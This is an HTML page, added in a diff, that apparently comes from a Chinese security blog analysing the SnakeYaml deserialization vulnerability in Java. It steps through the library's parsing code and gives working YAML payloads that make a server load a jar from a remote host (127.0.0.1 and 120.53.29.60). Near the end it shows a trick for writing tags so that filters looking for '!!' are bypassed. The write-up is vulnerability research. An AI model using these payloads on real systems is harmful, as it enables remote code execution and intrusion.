@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>Java SnakeYaml反序列化漏洞 | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2022-03-26T07:46:19.000Z" itemprop="datePublished">
+          2022-03-26
+      </time>
+    
+</span>
+                <h1>Java SnakeYaml反序列化漏洞</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>java的反序列化漏洞多样，有原生的反序列化，也有XMLDecoder反序列化，今天来分析一下SnakeYaml反序列化；</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>YAML是”YAML Ain’t a Markup Language”；它并不是一种标记语言，而是用来表示序列化的一种格式；类似于XML但比XML更简洁。在java中自然有对应的库对其进行解析，SnakeYaml；支持对象的序列化和反序列化；常见的利用javax.script.ScriptEngineManager的利用链是基于SPI机制进行实现的；</p>
+<h3 id="SPI机制："><a href="#SPI机制：" class="headerlink" title="SPI机制："></a>SPI机制：</h3><p>spi机制通俗一点来讲就是为相关接口提供动态实现类的机制；使用 SPI 机制需要在Java classpath 下的 <strong>META-INF/services/</strong> 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类的全限定类名。又有点类似于thinkphp6中最开始实现new App这个类（继承container容器）的时候会在构造器里进行provider文件里相关映射的载入，载入之后和container进行绑定；控制反转（IOC）的思想，进行调用的时候都是触发get魔术方法然后去bind里进行相关映射的实例化然后绑定到instances数组里（和container绑定）；这一切都是container处理的；说的多了，回归正题；</p>
+<p>先来写一段程序看一下yaml的处理流程；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGnpng"><img src="https://s1.ax1x.com/2022/03/24/qGnpng.png" alt="qGnpng.png"></a></p>
+<p>不难理解，setter是最开始我们自己调用的；在序列化的时候调用javaBean的getter操作，如果相关class的属性本就public，则没必要；snakeYaml可直接拿到相关的属性；反序列化先调用构造器，然后调用setter进行赋值；如果属性为public，则也不会调用setter；</p>
+<p>可以追溯一下流程分析一下：</p>
+<p>调用load方法进行相关的加载；采用StreamReader封装之后调用loadFromReader进行处理；Object.class意味着转化结果为一个object对象；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGMs81"><img src="https://s1.ax1x.com/2022/03/24/qGMs81.png" alt="qGMs81.png"></a></p>
+<p>接着跟进去loadFromReader函数；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGl9FH"><img src="https://s1.ax1x.com/2022/03/24/qGl9FH.png" alt="qGl9FH.png"></a></p>
+<p>在ParserImpl中对sreader做了相关的处理映射；追进去看一下；利用重载拿到相关映射；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGlxcq"><img src="https://s1.ax1x.com/2022/03/24/qGlxcq.png" alt="qGlxcq.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGMG3q"><img src="https://s1.ax1x.com/2022/03/24/qGMG3q.png" alt="qGMG3q.png"></a></p>
+<p>在getSingleData中完成相应的转换，转换成Node节点类型：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qG3rdO"><img src="https://s1.ax1x.com/2022/03/24/qG3rdO.png" alt="qG3rdO.png"></a></p>
+<p>跟进getNode看一波</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qG836I"><img src="https://s1.ax1x.com/2022/03/24/qG836I.png" alt="qG836I.png"></a></p>
+<p>在composeNode里完成相关的节点转换；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qG8c7T"><img src="https://s1.ax1x.com/2022/03/24/qG8c7T.png" alt="qG8c7T.png"></a></p>
+<p>在composeNode中继续跟进看一下具体原理；composer.class下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qG8xgA"><img src="https://s1.ax1x.com/2022/03/24/qG8xgA.png" alt="qG8xgA.png"></a></p>
+<p>从这个调用点一路追踪下去就可以看到整体的调换过程；具体的就不细贴了；</p>
+<p>最后触发是在ParserImpl.class下进行相关的替换，将！！替换成为tag；然后进行拼接，形成新的tag；如下图：（node就是User）</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGwDgS"><img src="https://s1.ax1x.com/2022/03/24/qGwDgS.png" alt="qGwDgS.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qG0EPP"><img src="https://s1.ax1x.com/2022/03/24/qG0EPP.png" alt="qG0EPP.png"></a></p>
+<p>上面这个看的更加明显；已经在此发生了替换；</p>
+<p>一番调用和解析之后回到getSingleNode函数：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGBRpV"><img src="https://s1.ax1x.com/2022/03/24/qGBRpV.png" alt="qGBRpV.png"></a></p>
+<p>转化为Node节点类型之后返回；看一下节点的存储效果；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGBO1K"><img src="https://s1.ax1x.com/2022/03/24/qGBO1K.png" alt="qGBO1K.png"></a></p>
+<p>返回到getSingleData函数：先判断node和tag是否为空；若不是则进入后续判断yaml格式数据的类型是否为Object类型；然后再判断tag是否为空，都不满足进入后续的流程；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGsXcV"><img src="https://s1.ax1x.com/2022/03/24/qGsXcV.png" alt="qGsXcV.png"></a></p>
+<p>继续跟着调试；</p>
+<p>进入到getClassForNode函数，先根据node中的tag拿到相关的classname。然后调用getClassForName拿到相关的class对象；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qG60de"><img src="https://s1.ax1x.com/2022/03/24/qG60de.png" alt="qG60de.png"></a></p>
+<p>进入getClassForName函数中看一下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGgF9s"><img src="https://s1.ax1x.com/2022/03/24/qGgF9s.png" alt="qGgF9s.png"></a></p>
+<p>可以发现是直接Class.forName直接加载并且初始化类形成class对像；</p>
+<p>接着追溯发现是调用newInstance对相关的class进行实例化操作；拿到User实例；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGgjPJ"><img src="https://s1.ax1x.com/2022/03/24/qGgjPJ.png" alt="qGgjPJ.png"></a></p>
+<p>然后跟着程序来到constructJavaBean2ndStep函数中；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qG2ri4"><img src="https://s1.ax1x.com/2022/03/24/qG2ri4.png" alt="qG2ri4.png"></a></p>
+<p>在经过flattenMapping函数之时，触发对class的内省操作，拿到class中的相关的属性以及其数量；后续调用getValue函数对Node节点进行处理，拿到相关的值；如下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGRFO0"><img src="https://s1.ax1x.com/2022/03/24/qGRFO0.png" alt="qGRFO0.png"></a></p>
+<p>接着就开始对这两个节点开始循环处理，不用想此处就是赋值的操作了；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGRGTO"><img src="https://s1.ax1x.com/2022/03/24/qGRGTO.png" alt="qGRGTO.png"></a></p>
+<p>在while中循环进行处理，会先判断相关属性是否可写；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGRxnx"><img src="https://s1.ax1x.com/2022/03/24/qGRxnx.png" alt="qGRxnx.png"></a></p>
+<p>如果可写则进入后续的流程：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGWM4g"><img src="https://s1.ax1x.com/2022/03/24/qGWM4g.png" alt="qGWM4g.png"></a></p>
+<p>采用反射进行最后的处理赋值；这个点的原理就是调用相关的setter了；看下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGW48H"><img src="https://s1.ax1x.com/2022/03/24/qGW48H.png" alt="qGW48H.png"></a></p>
+<p>最后就可进行属性的赋值；另一个属性也是这样的原理，也是最后触发setter对其进行赋值；最后实例化结束return回去对象；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGfus1"><img src="https://s1.ax1x.com/2022/03/24/qGfus1.png" alt="qGfus1.png"></a></p>
+<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>分析完基本的反序列化情况，就来看一下相关漏洞利用点；因为SnakeYaml支持反序列化Java对象（上面已经分析过），所以当Yaml.load()函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞。</p>
+<p>进行调试：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGHd5q"><img src="https://s1.ax1x.com/2022/03/24/qGHd5q.png" alt="qGHd5q.png"></a></p>
+<p>正常的拿到了ScriptEngineManager；后续对ClassLoader以及URL进行实例化之后传入ScriptEngineManager的构造器；直接追溯到ScriptEngineManager看一波：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGbKL4"><img src="https://s1.ax1x.com/2022/03/24/qGbKL4.png" alt="qGbKL4.png"></a></p>
+<p>触发init方法；追过去；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGbrFI"><img src="https://s1.ax1x.com/2022/03/24/qGbrFI.png" alt="qGbrFI.png"></a></p>
+<p>可以看到实例化了ServiceLoader，这里就触发了SPI机制；继续深入一波：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGqeAA"><img src="https://s1.ax1x.com/2022/03/24/qGqeAA.png" alt="qGqeAA.png"></a></p>
+<p>在getServiceLoader函数中利用；跟下去</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGqoHH"><img src="https://s1.ax1x.com/2022/03/24/qGqoHH.png" alt="qGqoHH.png"></a></p>
+<p>进入LazyIterator实例中进行处理；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qGLJKO"><img src="https://s1.ax1x.com/2022/03/24/qGLJKO.png" alt="qGLJKO.png"></a></p>
+<p>最终在LazyIterator实例的hasNextService方法中进行加载；这里调用urlclasslaoder会先进行本地的加载；具体可以看如下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qJvKDf"><img src="https://s1.ax1x.com/2022/03/24/qJvKDf.png" alt="qJvKDf.png"></a></p>
+<p>先进行本地的spi机制的加载，按照相关的机制规则在本地寻找相关的class实现；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qJv5Ie"><img src="https://s1.ax1x.com/2022/03/24/qJv5Ie.png" alt="qJv5Ie.png"></a></p>
+<p>可以看下面几张图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qJxref"><img src="https://s1.ax1x.com/2022/03/24/qJxref.png" alt="qJxref.png"></a></p>
+<p>这个是我最开始测试的时候将vps的jar包下载到本地之后进行导入；导入之后这里也会被进行相关的加载，所以可以很显然的看到是进行本地的一些spi机制的处理，这是因为java的双亲委派机制，会导致先使用parent classlaoder进行加载，先将本地处理完之后再去处理远程的加载；可以如此处理的原因是程序中写了while；会一直进行相关机制的加载，直到进行完为止；进行远程也是因为我们之前设置了urlclasslaoder的path为远程路径；</p>
+<p>可以看到根据spi机制去拿到相关的class，然后后续会进行实例化操作从而触发恶意命令；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qJzifH"><img src="https://s1.ax1x.com/2022/03/24/qJzifH.png" alt="qJzifH.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qJz1pj"><img src="https://s1.ax1x.com/2022/03/24/qJz1pj.png" alt="qJz1pj.png"></a></p>
+<p>这是先进行本地的相关机制实现，然后就是处理我们构造的恶意数据从而进行远程的spi机制实现；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYSSvn"><img src="https://s1.ax1x.com/2022/03/24/qYSSvn.png" alt="qYSSvn.png"></a></p>
+<p>不难发现，已经去远程加载相关的jar包下的路径；这里用jar进行封装可以看下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYSZ8J"><img src="https://s1.ax1x.com/2022/03/24/qYSZ8J.png" alt="qYSZ8J.png"></a></p>
+<p>可以看到处理的是一个jarLoader，对相关的内容进行请求加载；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYSRrq"><img src="https://s1.ax1x.com/2022/03/24/qYSRrq.png" alt="qYSRrq.png"></a></p>
+<p>可以看到也是拿到相关文件内部的实现类；后续就是利用Class.forName和newInstance了；就会触发恶意命令造成rce；</p>
+<p>当然不采用jar进行封装也是可以的；要满足相应的目录如下所示：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYC35T"><img src="https://s1.ax1x.com/2022/03/24/qYC35T.png" alt="qYC35T.png"></a></p>
+<p>如此才可触发相应的spi加载识别；最后触发rce；</p>
+<p>其实分析到这里，可以看到snakeyaml的反序列化调用方式和fastjson的十分相似，所以经常将两者放在一起进行分析；那么fastjson的一些利用链条就可以尝试进行snakeyaml的反序列化调用；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYiWUP"><img src="https://s1.ax1x.com/2022/03/25/qYiWUP.png" alt="qYiWUP.png"></a></p>
+<p>一个经典的链条也可直接进行触发；</p>
+<h2 id="小trick的补充"><a href="#小trick的补充" class="headerlink" title="小trick的补充"></a>小trick的补充</h2><p>通过上面的分析，我们可以很清晰的看到他的相关调用流程和fastjson的十分相似；但是有一点不同的是fastjson会根据属性的getOnly特性来进行调用getter进行处理，然而snakeyaml不会有这个特性，所以也注定一些调用方式snakeyaml无法调用但是fastjson可以调用，就比如TemplatesImpl这个class的调用链；最后是靠着getter启动触发的；</p>
+<p>除上述的之外，可以看到追过snakeyaml之后可以很显然的发现，<code>!!</code>的功能和<code>@type</code>有点类似，用于指定要反序列化的全类名。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [<span class="string">&quot;http://127.0.0.1:2333/&quot;</span>]]]]</span><br></pre></td></tr></table></figure>
+
+<p>这条 POC 都是网上公开最常见的，所有 POC 都是基于 !! 来反序列化。这也就误导了一些程序员认为 !! 是导致反序列化的原因。其实不然，通过上述的分析可以很清晰的看到程序会先将<code>!!</code>转换为tag，然后将String字符串转换为Node节点；最后的处理是根据Node节点来进行解析的；所以基本想法是如果可以找到一个可替代<code>!!</code>的东西，在生成Node的时候也可以替换成相关的Node；那么也就可以不采用<code>!!</code>的情况下进行反序列化攻击；贴一下相关的tag：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PREFIX = <span class="string">&quot;tag:yaml.org,2002:&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag YAML = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:yaml&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag MERGE = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:merge&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag SET = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:set&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag PAIRS = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:pairs&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag OMAP = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:omap&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag BINARY = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:binary&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag INT = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:int&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag FLOAT = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:float&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag TIMESTAMP = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:timestamp&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag BOOL = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:bool&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag NULL = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:null&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag STR = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:str&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag SEQ = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:seq&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Tag MAP = <span class="keyword">new</span> Tag(<span class="string">&quot;tag:yaml.org,2002:map&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>每一种对应的类型都会有其相关的tag；对于我们上述最开始的User反序列化过程来看，User类型转换成Node之后就是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tag:yaml.org,<span class="number">2002</span>:User</span><br></pre></td></tr></table></figure>
+
+<p>String转化之后就为</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYYX8S"><img src="https://s1.ax1x.com/2022/03/25/qYYX8S.png" alt="qYYX8S.png"></a></p>
+<p>可以看清楚都是是转化为了keyNode和valueNode，方便之后的遍历处理；转回正题，看一下官网上的描述：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYtzRO"><img src="https://s1.ax1x.com/2022/03/25/qYtzRO.png" alt="qYtzRO.png"></a></p>
+<p>可以看到还有两种写法；就是<code>!</code>加上<code>&lt;</code>的方式；先来测试一下string类型的；另一种稍后说；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYNsFx"><img src="https://s1.ax1x.com/2022/03/25/qYNsFx.png" alt="qYNsFx.png"></a></p>
+<p>可以很清晰的看到已经成功的转化；那么后续的就很简单了。不过要说明一个问题，这种方法调用的时候需要被反序列化类有一个单参数构造器；这个十分的必要；举个例子如下：如果User里没有单参数构造器；则会抛出如此的错误：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYdFeJ"><img src="https://s1.ax1x.com/2022/03/25/qYdFeJ.png" alt="qYdFeJ.png"></a></p>
+<p>加上一个参数构造器；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYd3TA"><img src="https://s1.ax1x.com/2022/03/25/qYd3TA.png" alt="qYd3TA.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYd0mQ"><img src="https://s1.ax1x.com/2022/03/25/qYd0mQ.png" alt="qYd0mQ.png"></a></p>
+<p>所以依葫芦画瓢：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String new_test = <span class="string">&quot;!&lt;tag:yaml.org,2002:javax.script.ScriptEngineManager&gt; &quot;</span> +</span><br><span class="line">        <span class="string">&quot;[!&lt;tag:yaml.org,2002:java.net.URLClassLoader&gt; &quot;</span> +</span><br><span class="line">        <span class="string">&quot;[[!&lt;tag:yaml.org,2002:java.net.URL&gt; &quot;</span> +</span><br><span class="line">        <span class="string">&quot;[http://120.53.29.60:9900/]]]]&quot;</span>;</span><br><span class="line">        <span class="comment">//&quot;&#123;!&lt;tag:yaml.org,2002:str&gt; dataSourceName: ldap://120.53.29.60:1389/skgw2z, !&lt;tag:yaml.org,2002:bool&gt; autoCommit: true&#125;&quot;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Object obj = yaml.load(new_test);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>
+
+<p>也可直接触发；</p>
+<p>来说另一种写法，类似于提前声明一样；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qY6bOP"><img src="https://s1.ax1x.com/2022/03/25/qY6bOP.png" alt="qY6bOP.png"></a></p>
+<p>这种要求也是需要有有参构造器；不过这里可以传入[]进行参数的赋值；所以无论几个参数都是可以的；所以照样依葫芦画瓢；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String attack = <span class="string">&quot;%TAG ! tag:yaml.org,2002:\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;---\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [\&quot;http://120.53.29.60:9900/\&quot;]]]]&quot;</span>;</span><br><span class="line">Object obj = yaml.load(attack);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>
+
+<p>所以依然可以造成攻击：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qYca6I"><img src="https://s1.ax1x.com/2022/03/25/qYca6I.png" alt="qYca6I.png"></a></p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="/2022/03/26/%E4%B8%80%E4%B8%AAjava-oa%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1/">
+        一个java-oa简单审计 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
